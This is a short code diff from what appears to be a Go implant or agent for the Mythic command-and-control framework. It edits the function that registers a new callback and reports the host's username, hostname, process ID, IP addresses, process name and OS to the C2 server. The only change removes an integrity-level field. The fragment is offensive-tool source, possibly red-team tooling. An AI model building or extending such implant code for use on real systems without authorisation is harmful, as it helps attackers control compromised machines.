@@ -319,16 +319,15 @@ func registerWithMythic() error {
         variables := map[string]interface{}{
                 "payloadUuid": "9df7dfc4-f21d-4b03-9962-9f3272669b85",
                 "newCallback": map[string]interface{}{
-                        "c2_profile":       "HTTP",
-                        "user":             user.Username,
-                        "host":             hostname,
-                        "pid":              os.Getpid(),
-                        "ip":               "192.168.1.100",
-                        "external_ip":      "203.0.113.1",
-                        "process_name":     "phantom_advanced.exe",
-                        "integrity_level":  2,
-                        "os":               fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH),
-                        "architecture":     runtime.GOARCH,
+                        "c2_profile":    "HTTP",
+                        "user":          user.Username,
+                        "host":          hostname,
+                        "pid":           os.Getpid(),
+                        "ip":            "192.168.1.100",
+                        "external_ip":   "203.0.113.1",
+                        "process_name":  "phantom_advanced.exe",
+                        "os":            fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH),
+                        "architecture":  runtime.GOARCH,
                 },
         }
         
